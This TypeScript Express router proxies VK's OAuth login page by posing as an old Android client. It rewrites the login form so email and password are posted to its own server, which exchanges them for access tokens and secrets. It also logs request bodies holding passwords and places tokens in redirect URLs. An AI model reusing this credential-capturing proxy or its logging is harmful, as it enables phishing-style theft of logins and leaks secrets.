import {vkTokenAncor} from "@/configurations"
import {AndroidClient, AuthUrl, deviceIDgen, encodeQueryData, TokenUrl} from "@/helper"
import {Request, Response} from "@/types"
import express from "express"
import fs, {readFileSync} from 'fs'
import path from "path"

export const authForm = express.Router()

const callBack = (html: string, url: string) => {

  let regex;

  regex = /,window._preventEvents=\["click","touchstart","touchend","mouseover","mousemove"\]/gi
  html = html.replace(regex, "")
  regex = /&&location.reload\(\)/gi
  html = html.replace(regex, "")
  regex = /<form[^>]*>/gi
  html = html.replace(regex, `<form method="post" action="${url}">`)
  return html
}

/**
 * authorization page for android (legacy flow)
 * Emulates old Android client, proxies VK auth HTML, and rewrites form action to POST /vk
 * This lets us capture login/password and exchange for token/secret on the server.
 */
authForm.get('/vk', async (req: Request, res: Response) => {
  const params = {
    client_id: process.env.VK_ADMIN_ID,
    scope: 1,
    redirect_uri: "https://oauth.vk.com/blank.html",
    display: "mobile",
    response_type: "token",
    revoke: 1,
    v: "5.103",
  };

  try {
    const url = `${AuthUrl}?${new URLSearchParams(params).toString()}`;
    console.log("===Proxying VK OAuth page:", url);

    // Fetch auth page as old Android client. VK may redirect (302) first; follow manually to ensure we get HTML.
    const first = await AndroidClient.get(url, { maxRedirects: 0, validateStatus: (status) => status < 400 });
    let htmlResponse = first;

    // If first response is a redirect with Location, follow it to fetch the actual HTML
    const loc = first.headers?.location;
    if (first.status >= 300 && first.status < 400 && loc) {
      const followUrl = new URL(loc, AuthUrl).toString();
      console.log("===Following redirect to:", followUrl);
      htmlResponse = await AndroidClient.get(followUrl, { maxRedirects: 0, validateStatus: (status) => status < 400 });
    }

    const html = callBack(htmlResponse.data, "vk");

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(html);
  } catch (error: any) {
    console.error("===GET /auth/vk proxy failed:", error.message);
    return res.status(500).send("Failed to load VK auth page");
  }
});

/**
 * Callback endpoint - VK will redirect here after auth
 */
authForm.get('/callback', async (req: Request, res: Response) => {
  console.log("===OAuth callback received");
  
  // VK redirects with hash (#access_token=...) but we can't read it on server
  // So we return a simple HTML page that reads the hash and redirects to blank.html
  const callbackHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Redirecting...</title>
</head>
<body>
  <script>
    // Get hash from URL (VK puts auth data here)
    const hash = window.location.hash;
    if (hash && hash.includes('access_token')) {
      // Redirect to blank.html with the same hash
      window.location.href = 'https://oauth.vk.com/blank.html' + hash;
    } else {
      // Auth failed
      window.location.href = 'https://oauth.vk.com/blank.html#error=access_denied';
    }
  </script>
  <p>Redirecting...</p>
</body>
</html>
  `;
  
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(callbackHtml);
});

// TODO: replace - /helper/request-secret-and-token-by-login-and-password
/**
 * get token and secret by login and password
 * emulate old android app
 */
authForm.post('/vk', async (req: Request, res: Response) => {
  console.debug("=====> auth.post", req.body, req.session)
  if (!req.body || !req.body.email || !req.body.pass) {
    res.status(500).send({errMessage: "No vkuser or vkpassword in post request"})
    return
  }

  // Check if already have valid session
  if (req.session?.access_token && req.session?.secret) {
    const data = req.session
    return res.redirect(`blank.html#success=1&access_token=${data.access_token}&user_id=${data.user_id}&secret=${data.secret}`)
  }

  try {
    // Step 1: GET authorization page to get cookies and form data
    const authPageUrl = `${AuthUrl}?client_id=${process.env.VK_ADMIN_ID}&scope=1&redirect_uri=${vkBlankUrl}&display=mobile&response_type=token&revoke=1`;
    console.debug("Step 1: Getting auth page", authPageUrl);
    
    const authPageResponse = await AndroidClient.get(authPageUrl, {
      maxRedirects: 0,
      validateStatus: (status) => status < 400,
    });

    // Step 2: POST credentials to the authorization endpoint
    const formData = new URLSearchParams();
    formData.append('email', req.body.email);
    formData.append('pass', req.body.pass);

    console.debug("Step 2: Posting credentials");
    const loginResponse = await AndroidClient.post(authPageUrl, formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': authPageUrl,
      },
      maxRedirects: 0,
      validateStatus: (status) => status < 400,
    });

    // Check for redirect to blank.html with token in hash
    const location = loginResponse.headers.location || '';
    console.debug("Login response location:", location);

    if (location.includes('blank.html#') || location.includes('access_token=')) {
      // Parse token from redirect URL
      const url = new URL(location, vkBlankUrl);
      const hash = url.hash.substring(1); // Remove #
      const params = new URLSearchParams(hash);
      
      const access_token = params.get('access_token');
      const user_id = params.get('user_id');
      const secret = params.get('secret');

      if (access_token && user_id) {
        req.session.secret = secret || '';
        req.session.user_id = user_id;
        req.session.access_token = access_token;
        req.session.device_id = deviceIDgen();

        console.debug("✅ Successfully authenticated:", { user_id, has_secret: !!secret });
        return res.redirect(`blank.html#success=1&access_token=${access_token}&user_id=${user_id}&secret=${secret}`);
      }
    }

    // If we got here, check if VK wants 2FA or other verification
    if (location && location.includes('act=auth')) {
      console.warn("🔐 2FA or additional verification required");
      return res.redirect(location);
    }

    throw new Error('No access token in response');

  } catch (error: any) {
    console.error("======> auth.post ERROR =======", error.message);
    if (error.response) {
      console.error("Response status:", error.response.status);
      console.error("Response location:", error.response.headers?.location);
      
      // Check if this is a redirect to 2FA or verification page
      const location = error.response.headers?.location || '';
      if (location && (location.includes('act=authcheck') || location.includes('act=security_check'))) {
        console.warn("🔐 2FA verification required, redirecting...");
        return res.redirect(location);
      }
    }
    
    res.status(500).send({errMessage: error.message || 'Authentication failed'});
    return;
  }
})


authForm.get('/blank.html', async (req: Request, res: Response) => {
  //console.log(path.resolve(process.cwd(), 'docs/blank.html'))
  //const file: string = readFileSync(path.resolve(process.cwd(), 'docs/blank.html'), 'utf-8')
  res.setHeader('Content-Type', 'text/html; charset="utf-8"')
  //form with post request
  res.send("<html><body></body></html>").end()
  return;
})

// - ########################################## test-mock
authForm.get('/local', async (req: Request, res: Response) => {
  const openApiPath = path.resolve(process.cwd(), 'docs/auth.html');
  if (!fs.existsSync(openApiPath)) {
    console.error('❌ openapi.yaml not found at:', openApiPath);
    process.exit(1);
  }
  console.log(openApiPath)
  const file: string = readFileSync(openApiPath, 'utf-8')
  let html: string = callBack(file, "local")
  res.setHeader('Content-Type', 'text/html')
  //form with post request
  res.send(html).end()
})

//https://oauth.vk.com/blank.html
authForm.post('/local', async (req: Request, res: Response) => {
  console.log("===Local post", req.body)
  console.log("redirect blank.html" + vkTokenAncor)
  res.redirect("blank.html" + vkTokenAncor)
})
